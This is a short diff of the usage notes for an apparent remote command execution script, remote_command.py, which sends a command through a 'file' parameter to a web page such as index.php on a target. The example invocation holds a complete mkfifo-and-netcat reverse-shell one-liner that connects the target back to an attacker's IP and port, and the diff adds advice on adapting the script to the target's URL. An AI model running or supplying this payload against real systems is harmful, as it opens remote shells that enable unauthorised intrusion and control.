@@ -9,7 +9,7 @@ In the MakeRequest() function, the
 # data = {
 #        'file': command
 #    } 
-command is the command user wants to execute on the target. 
+command is the command user wants to execute on the target. You can change index.php and file to correspond to what is shown in the URL. 
 
 Example:
 # python3 remote_command.py <target IP> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker's IP(10.0.2.3)> <attacker's port(443)> >/tmp/f"
